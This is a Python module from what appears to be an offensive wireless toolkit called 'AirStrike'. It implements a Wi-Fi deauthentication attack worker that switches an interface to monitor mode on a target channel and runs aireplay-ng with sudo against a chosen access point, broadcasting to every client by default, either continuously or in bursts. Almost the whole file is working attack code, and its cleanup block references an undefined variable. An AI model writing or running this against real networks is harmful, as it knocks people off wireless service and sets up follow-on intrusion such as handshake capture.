# AirStrike/core_attacks/deauth_attack.py
import os
import sys
import time
import subprocess
# from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp # If using Scapy for deauth

# --- Path Setup for utils (if needed directly, though app_config is better passed) ---
# This might not be strictly necessary if all config comes from shared_attack_params['app_config']
# project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
# if project_root not in sys.path:
#     sys.path.insert(0, project_root)
# from utils.network_utils import run_with_sudo # Example

def deauth_attack_worker(attack_id, network_params, attack_config_params, log_callback, status_callback, stop_event, app_config):
    """
    Worker function for deauthentication attacks.
    This function will be run in a separate thread by attack_service.py.

    Args:
        attack_id (str): Unique ID for this attack instance.
        network_params (dict): Contains target network info (bssid, channel, essid).
        attack_config_params (dict): Contains attack-specific configs (client_mac, count, interval).
        log_callback (function): Callback function to log messages (takes attack_id, message).
        status_callback (function): Callback function to update status (takes attack_id, status, progress).
        stop_event (threading.Event): Event to signal when to stop the attack.
        app_config (dict): A dictionary of the Flask app's configuration.
    """
    
    interface = app_config.get('DEFAULT_INTERFACE', 'wlan0') # Get interface from passed app_config
    log_callback(attack_id, f"Deauth worker started for attack ID {attack_id} on interface {interface}.")
    status_callback(attack_id, "initializing", 10)

    target_bssid = network_params.get('bssid')
    target_channel = network_params.get('channel')
    # Default to broadcast if client_mac is not specified or is empty
    target_client_mac = attack_config_params.get('client_mac') or "FF:FF:FF:FF:FF:FF" 
    
    # Deauth packets count per burst (0 for continuous until stop_event)
    # Your original JS for deauth had 'continuous' boolean and 'packetCount'.
    # If continuous, count for aireplay-ng is 0. Otherwise, it's the specified count.
    continuous_attack = attack_config_params.get('continuous', False)
    packet_count_per_burst_str = str(attack_config_params.get('packet_count', 10)) # Default 10
    
    # aireplay-ng --deauth 0 means continuous.
    # If not continuous, we'd need to loop 'packet_count_per_burst_str' times, which is less efficient
    # than letting aireplay-ng handle a fixed number of packets if it supports that directly for deauth.
    # For simplicity with aireplay-ng, if not continuous, we might just send one burst of N packets.
    # Let's assume 'deauth_burst_count_for_aireplay' is '0' for continuous, or a specific number for a single burst.
    deauth_burst_count_for_aireplay = "0" if continuous_attack else packet_count_per_burst_str
    
    # Interval for aireplay-ng is usually controlled by its internal logic or options not directly set as 'interval'
    # The '-0' or '--deauth' option in aireplay-ng sends packets rapidly.
    # If you need a specific interval between bursts (not individual packets), that's more complex.
    # For now, we assume aireplay-ng's default deauth behavior.

    if not target_bssid or target_channel is None:
        log_callback(attack_id, "Error: Target BSSID or channel not provided.")
        status_callback(attack_id, "failed", 0)
        return

    log_callback(attack_id, f"Target: BSSID={target_bssid}, Channel={target_channel}, Client={target_client_mac}")
    log_callback(attack_id, f"Mode: {'Continuous' if continuous_attack else f'Bursts of {packet_count_per_burst_str} packets'}")

    # --- Ensure utils are imported for mode setting ---
    # This is a bit redundant if already imported globally, but safer in a threaded function
    try:
        from utils.network_utils import set_monitor_mode as util_set_monitor_mode
        from utils.network_utils import set_managed_mode as util_set_managed_mode
        from utils.network_utils import run_with_sudo as util_run_with_sudo
    except ImportError:
        log_callback(attack_id, "Critical Error: Could not import network utilities for mode setting.")
        status_callback(attack_id, "failed", 0)
        return

    # 1. Set interface to Monitor Mode on the correct channel
    log_callback(attack_id, f"Setting interface '{interface}' to monitor mode on channel {target_channel}...")
    if not util_set_monitor_mode(interface): # This function should handle 'sudo'
        log_callback(attack_id, f"Error: Failed to set '{interface}' to monitor mode.")
        status_callback(attack_id, "failed", 15)
        return
    
    # Set channel using iwconfig or iw (run_with_sudo should handle sudo)
    # This step might be redundant if set_monitor_mode also handles channel, or if aireplay-ng handles it.
    # However, explicitly setting it can be more reliable.
    channel_set_success, _, channel_err = util_run_with_sudo(f"iwconfig {interface} channel {target_channel}")
    if not channel_set_success:
        log_callback(attack_id, f"Warning: Failed to set channel {target_channel} using iwconfig. Error: {channel_err}. aireplay-ng might still work if BSSID is on this channel.")
        # Not necessarily a fatal error, as aireplay-ng can sometimes find the AP if it's channel hopping or if the BSSID is enough.
    else:
        log_callback(attack_id, f"Interface '{interface}' set to channel {target_channel}.")
    
    status_callback(attack_id, "running", 30)

    # 2. Construct and run aireplay-ng command
    # aireplay-ng --deauth <count> -a <bssid> [-c <client_mac>] <interface>
    aireplay_cmd_list = [
        "aireplay-ng",
        "--deauth", deauth_burst_count_for_aireplay,
        "-a", target_bssid
    ]
    if target_client_mac and target_client_mac.upper() != "FF:FF:FF:FF:FF:FF":
        aireplay_cmd_list.extend(["-c", target_client_mac])
    aireplay_cmd_list.append(interface)

    log_callback(attack_id, f"Executing command: {' '.join(['sudo'] + aireplay_cmd_list)} ") # run_with_sudo adds sudo

    process = None
    try:
        # We need to manage this process and check stop_event
        # Popen is non-blocking
        cmd_str_for_run_with_sudo = " ".join(aireplay_cmd_list)
        
        # For a long-running command like continuous deauth, Popen is better
        # so we can monitor stop_event. run_with_sudo uses communicate() which blocks.
        # So, we need to adapt how we call sudo commands for long processes.
        
        # Simplification: If continuous, let it run and user must stop it.
        # If fixed count, run_with_sudo might be okay if timeout is sufficient.
        
        # Let's use Popen directly for better control with stop_event
        if os.geteuid() != 0: # If not root, prepend sudo
            aireplay_cmd_list.insert(0, 'sudo')

        process = subprocess.Popen(aireplay_cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        log_callback(attack_id, f"aireplay-ng process started (PID: {process.pid}).")
        status_callback(attack_id, "running", 50)

        # Monitor loop for continuous attack or waiting for fixed count to finish
        # For continuous, this loop checks stop_event.
        # For fixed count, aireplay-ng exits on its own.
        while True:
            if stop_event.is_set():
                log_callback(attack_id, "Stop event received. Terminating aireplay-ng.")
                process.terminate() # Send SIGTERM
                try:
                    process.wait(timeout=5) # Wait for graceful termination
                except subprocess.TimeoutExpired:
                    log_callback(attack_id, "aireplay-ng did not terminate gracefully, sending SIGKILL.")
                    process.kill() # Force kill
                status_callback(attack_id, "stopped", 90)
                break

            if process.poll() is not None: # Process has finished
                log_callback(attack_id, f"aireplay-ng process finished with code {process.returncode}.")
                if process.returncode == 0:
                    status_callback(attack_id, "completed", 100)
                else:
                    stderr_output = process.stderr.read() if process.stderr else "N/A"
                    log_callback(attack_id, f"aireplay-ng exited with error. STDERR: {stderr_output}")
                    status_callback(attack_id, "failed", process.returncode) # Or some progress value
                break
            
            # Update progress for continuous attack (optional, could be based on time)
            if continuous_attack:
                # Simple time-based progress for demo
                # elapsed_time = time.time() - shared_attack_params['start_time'] # Needs start_time passed or stored
                # max_duration = 300 # Example max duration for progress display
                # progress = min(95, 50 + int((elapsed_time / max_duration) * 45))
                # status_callback(attack_id, "running", progress)
                pass # For continuous, progress might stay at 50-95% until stopped

            time.sleep(0.5) # Check stop_event periodically

    except FileNotFoundError:
        log_callback(attack_id, "Error: aireplay-ng command not found. Is aircrack-ng suite installed?")
        status_callback(attack_id, "failed", 20)
    except Exception as e:
        log_callback(attack_id, f"An error occurred during deauth attack: {e}")
        status_callback(attack_id, "failed", 25)
        if process and process.poll() is None:
            process.kill()
    finally:
        log_callback(attack_id, f"Cleaning up: Restoring interface '{interface}' to managed mode.")
        if not util_set_managed_mode(interface):
            log_callback(attack_id, f"Warning: Failed to restore '{interface}' to managed mode.")
        
        final_status = "stopped" if stop_event.is_set() else (_active_attacks.get(attack_id, {}).get('status', 'unknown_end'))
        if final_status not in ["completed", "failed", "stopped"]: # Ensure a final status is set
            status_callback(attack_id, "completed" if process and process.returncode == 0 else "stopped", 100)
        log_callback(attack_id, "Deauth worker finished.")

